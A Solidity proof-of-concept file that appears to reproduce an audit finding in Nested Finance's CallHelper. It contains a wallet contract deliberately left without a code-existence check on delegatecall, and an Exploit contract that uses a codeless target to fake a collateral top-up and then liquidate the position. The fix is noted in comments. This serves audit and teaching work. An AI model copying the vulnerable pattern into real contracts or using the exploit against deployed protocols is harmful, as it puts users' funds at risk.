// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Nested Finance CallHelper — Trail of Bits, Feb 2023 (TOB nested review)
    functionDelegateCallUnverified delegatecalls a user-supplied target and
    treats a success flag as "the payload ran". The EVM returns success for an
    account with no code. Bob's top-up therefore looks applied, collateral
    stays 1000, and the 1000-unit position is liquidated. The report reaches
    the empty account by destroying the HyVM; this reduction starts from that
    end state (address 0xBEEF has no code), which is the condition the missing
    extcodesize check fails to reject.

    Verbatim shape: (bool success, bytes memory returndata) = target.delegatecall(data);
    if (success) return returndata;
*/

contract PositionToken {
    string public symbol = "NEST";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract NestedWallet {
    PositionToken public token;
    uint256 public collateral = 1000 ether;
    uint256 public requiredCollateral = 1500 ether;
    bool public lastSuccess;
    bool public seized;

    constructor(PositionToken _token) {
        token = _token;
    }

    function functionDelegateCallUnverified(address target, bytes memory data) internal returns (bytes memory) {
        (bool success, bytes memory returndata) = target.delegatecall(data); // @> VULN: no extcodesize check; a codeless account returns success and runs nothing
        // FIX: require(target.code.length > 0, "no code");
        if (success) {
            return returndata;
        }
        _revert(returndata);
    }

    function execute(address target, bytes memory data) external {
        functionDelegateCallUnverified(target, data);
        lastSuccess = true;
    }

    /// @notice Short-term fix from the report. Not used by run().
    function executeChecked(address target, bytes memory data) external {
        require(target.code.length > 0, "no code");
        functionDelegateCallUnverified(target, data);
        lastSuccess = true;
    }

    function credit(uint256 amount) external {
        require(msg.sender == address(this), "self");
        collateral += amount;
    }

    function liquidate() external {
        require(collateral < requiredCollateral, "healthy");
        uint256 amt = token.balanceOf(address(this));
        require(token.transfer(msg.sender, amt), "seize");
        seized = true;
    }

    function _revert(bytes memory returndata) internal pure {
        if (returndata.length > 0) {
            assembly {
                revert(add(returndata, 32), mload(returndata))
            }
        }
        revert("delegatecall failed");
    }
}

/// @dev Live HyVM used only by the control test. topUp delegatecalls into the wallet.
contract HyVM {
    function topUp(uint256 amount) external {
        NestedWallet(address(this)).credit(amount);
    }
}

contract Exploit {
    PositionToken public token; // CREATE nonce 1
    NestedWallet public wallet; // CREATE nonce 2 — vulnerable CallHelper
    address public constant DESTROYED_HYVM = address(0xBEEF);

    constructor() {
        token = new PositionToken();
        wallet = new NestedWallet(token);
        token.mint(address(wallet), 1000 ether);
    }

    function run() external {
        bytes memory data = abi.encodeWithSignature("topUp(uint256)", 500 ether);
        wallet.execute(DESTROYED_HYVM, data);
        require(wallet.lastSuccess(), "empty delegatecall reported success");
        require(wallet.collateral() == 1000 ether, "top-up did not land");
        require(DESTROYED_HYVM.code.length == 0, "target has code");
        wallet.liquidate();
        require(wallet.seized(), "not liquidated");
        require(token.balanceOf(address(this)) == 1000 ether, "position seized");
        require(token.balanceOf(address(wallet)) == 0, "wallet emptied");
    }
}
